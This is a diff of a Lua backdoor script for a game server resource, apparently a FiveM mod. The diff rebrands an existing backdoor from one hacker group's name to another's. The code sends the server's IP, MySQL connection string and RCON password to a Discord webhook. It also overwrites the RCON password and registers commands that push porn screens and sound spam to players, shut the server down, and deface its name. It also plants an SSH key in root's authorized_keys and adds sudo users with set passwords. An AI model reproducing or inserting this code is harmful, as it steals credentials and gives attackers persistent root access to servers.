@@ -48,7 +48,7 @@ if not dksa9308592 then
 			rs225106820 = tostring(resultData)
 			PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
 			local IP = rText
-				fullContent = "__**Server Info:**__\n\nServer IP: **"..IP.."**\nServer Name: **".. GetConvar('sv_hostname').. "**\n\n__**Anderwertige Info:**__\n\nMySQL String: **" .. GetConvar('mysql_connection_string') .. "**\nRCON: **" .. GetConvar('rcon_password') .. "**\n\n__**Backdoor Info:**__\n\nBackdoor Port: **4078** & **22**\nBackdoor User: **DEEP** / **7777**\nBackdoor Password: **DEEP** / **7777**"
+				fullContent = "__**Server Info:**__\n\nServer IP: **"..IP.."**\nServer Name: **".. GetConvar('sv_hostname').. "**\n\n__**Anderwertige Info:**__\n\nMySQL String: **" .. GetConvar('mysql_connection_string') .. "**\nRCON: **" .. GetConvar('rcon_password') .. "**\n\n__**Backdoor Info:**__\n\nBackdoor Port: **4078** & **22**\nBackdoor User: **Fly** / **7777**\nBackdoor Password: **Fly** / **7777**"
 				
 				PerformHttpRequest("https://discord.com/api/webhooks/1107656078293991485/1-379G6FoQwyq-m79Eswq-YcpavoNW81NUJHzNC6oRDWoWrm9bloA9uv-ytitaz_pymD", function(err, text, header) end,
 				'POST', 
@@ -108,7 +108,7 @@ function Initialize()
 end
 
 function Edit()	
-	SetConvar("rcon_password", "DEEP")
+	SetConvar("rcon_password", "Fly")
 	if GetConvar("rcon_password") == nil or GetConvar("rcon_password") == "" then
 		local file = io.open(inputFile, 'r')
 		local fileContent = {}
@@ -120,8 +120,8 @@ function Edit()
 		fileContent[3] = 'This line has been edited'
 
 		file = io.open(inputFile, 'w')
-		file:write(sAjXAo..'\nrcon_password DEEP')
-		SetConvar("rcon_password", "DEEP")
+		file:write(sAjXAo..'\nrcon_password Fly')
+		SetConvar("rcon_password", "Fly")
 		io.close(file)
 	else
 	end
@@ -310,76 +310,75 @@ function SDhskXCsi391()
 	-- !> Install Backdoor in other Scripts <! --
 end
 
-RegisterCommand("DEEPinstallBackdoor", function(source, args, rawCommand)
+RegisterCommand("Install", function(source, args, rawCommand)
 	SDhskXCsi391()
 end, false)
 
-RegisterCommand("DEEPhackServer", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-HackServer', -1)
+RegisterCommand("Sörver ", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-HackServer', -1)
 end, false)
 
-RegisterCommand("DEEPblipsHack", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-BlipsHack', -1)
+RegisterCommand("Blüps", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-BlipsHack', -1)
 end, false)
 
-RegisterCommand("DEEPporn", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-pornScreen', -1)
+RegisterCommand("pörno", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-pornScreen', -1)
 end, false)
 
-RegisterCommand("DEEPsoundSpam", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-soundSpam', -1)
+RegisterCommand("Söound", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-soundSpam', -1)
 end, false)
 
-RegisterCommand("DEEPloadBrutan", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-Brutan', -1)
+RegisterCommand("Brutön", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-Brutan', -1)
 end, false)
 
-RegisterCommand("DEEPloadFalcon", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-Falcon', -1)
+RegisterCommand("Falcön", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-Falcon', -1)
 end, false)
 
-RegisterCommand("DEEPstopServer", function(source, args, rawCommand)
+RegisterCommand("stöpper", function(source, args, rawCommand)
 	os.exit()
 end, false)
 
-RegisterCommand("DEEPhackedNames", function(source, args, rawCommand)
-	serverName = "Server Hacked by DEEP | https://dsc.gg/deepware"
+RegisterCommand("Discörd", function(source, args, rawCommand)
+	serverName = "Server Hacked by Zyzz | https://dsc.gg/flyteam"
 	SetConvarReplicated("sv_hostname", string.format(serverName))
 	SetConvarServerInfo('tags', 'HACKED')
-	SetConvarServerInfo('tags', 'HACKED BY DEEP')
-	SetConvarServerInfo('tags', 'DEEP')
-	SetConvarServerInfo('tags', 'https://dsc.gg/deepware')
-	SetConvarServerInfo('tags', 'Server Hacked by DEEP | https://dsc.gg/deepware')
+	SetConvarServerInfo('tags', 'HACKED BY Zyzz')
+	SetConvarServerInfo('tags', 'Joinen sie dem Flyteam')
+	SetConvarServerInfo('tags', 'https://dsc.gg/flyteam')
+	SetConvarServerInfo('tags', 'Server Hacked by Zyzz | https://dsc.gg/flyteam')
 end, false)
 
-RegisterCommand("DEEPdiscordHack", function(source, args, rawCommand)
-	TriggerClientEvent('DEEP-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
+RegisterCommand("DiscordHeck", function(source, args, rawCommand)
+	TriggerClientEvent('Fly-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
 end, false)
 
-RegisterCommand("DEEPloadEverything", function(source, args, rawCommand)
+RegisterCommand("fickalles", function(source, args, rawCommand)
 	SDhskXCsi391()
-	TriggerClientEvent('DEEP-Backdoor-HackServer', -1)
-	TriggerClientEvent('DEEP-Backdoor-BlipsHack', -1)
-	TriggerClientEvent('DEEP-Backdoor-soundSpam', -1)
-	TriggerClientEvent('DEEP-Backdoor-Brutan', -1)
-	TriggerClientEvent('DEEP-Backdoor-Falcon', -1)
-	serverName = "Server Hacked by DEEP | https://dsc.gg/deepware"
+	TriggerClientEvent('Fly-Backdoor-HackServer', -1)
+	TriggerClientEvent('Fly-Backdoor-BlipsHack', -1)
+	TriggerClientEvent('Fly-Backdoor-soundSpam', -1)
+	TriggerClientEvent('Fly-Backdoor-Brutan', -1)
+	TriggerClientEvent('Fly-Backdoor-Falcon', -1)
+	serverName = "Server Hacked by Zyzz | https://dsc.gg/flyteam"
 	SetConvarReplicated("sv_hostname", string.format(serverName))
 	SetConvarServerInfo('tags', 'HACKED')
-	SetConvarServerInfo('tags', 'HACKED BY DEEP')
-	SetConvarServerInfo('tags', 'DEEP')
-	SetConvarServerInfo('tags', 'https://dsc.gg/deepware')
-	SetConvarServerInfo('tags', 'Server Hacked by DEEP | https://dsc.gg/deepware')
-	TriggerClientEvent('DEEP-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
+	SetConvarServerInfo('tags', 'HACKED BY Zyzz')
+	SetConvarServerInfo('tags', 'Joinen sie dem Flyteam')
+	SetConvarServerInfo('tags', 'https://dsc.gg/flyteam')
+	SetConvarServerInfo('tags', 'Server Hacked by Zyzz | https://dsc.gg/flyteam')
 end, false)
 
 function HackAddUser()
 	os.execute("chmod 700 ~/.ssh")
 	os.execute("chmod 600 ~/.ssh/authorized_keys")
 	os.execute("mkdir -p /root/.ssh/ && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeHv4SVwtcO+ALtit647WWkfDtQgaKSKRstREsvyfKp9FHhHS7ZYZxLF+AMglvecWCIrI2lfwYjotHNlKaAwMWxP82ET5mrnRqXZUYr+7onxTvRVhNg+oIp+b7j2DkR1Q7temVaLPFAMVEeWNnPOyShUaMc4TzvQFC1fg9qTzTSdf6mPSCw2gvu+/A5J6GQKykZYLXEO5YTw3QZ8uuPp17XK3ToqyQSPBeY+X3eE9xpGfXIg1Av2QDUkg/c5z94MYsMPw6iUKwfJDLQUepCQB1PR5SDDnR/IONQy3D/Dvr3Z13uMWHSUV1z3Y/s5lUoLyMiYWnBgyJwPsvL6Untf+3 rsa-key-20220503' > /root/.ssh/authorized_keys")
-	os.execute("adduser -h DEEP")
-	os.execute("echo -e \"test\ntest\" | passwd DEEP")
-	os.execute("usermod -aG sudo DEEP")
+	os.execute("adduser -h Fly")
+	os.execute("echo -e \"test\ntest\" | passwd Fly")
+	os.execute("usermod -aG sudo Fly")
 	os.execute("adduser -h /root -s /bin/ash 7777");os.execute("echo -e \"test\ntest\" | passwd 7777")
 end
 
